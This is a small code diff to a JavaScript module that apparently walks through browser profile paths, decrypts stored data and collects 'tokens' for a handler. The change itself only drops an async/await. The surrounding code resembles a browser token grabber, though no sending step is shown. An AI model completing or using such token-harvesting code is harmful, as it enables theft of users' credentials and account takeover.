@@ -146,7 +146,7 @@ const handleTokens = async (tokens, resolve) => {
   resolve();
 };
 
-module.exports = new Promise(async (resolve) => {
+module.exports = new Promise((resolve) => {
   for (const path of Object.keys(browsers)) {
     if (!existsSync(browsers[path])) continue;
     if (path.includes('Firefox')) {
@@ -181,7 +181,7 @@ module.exports = new Promise(async (resolve) => {
           });
         });
       }
-      await handleTokens(tokens, resolve);
+      handleTokens(tokens, resolve);
     } else {
       decryptRickRoll(browsers[path]).then(async () => await handleTokens(tokens, resolve));
     }
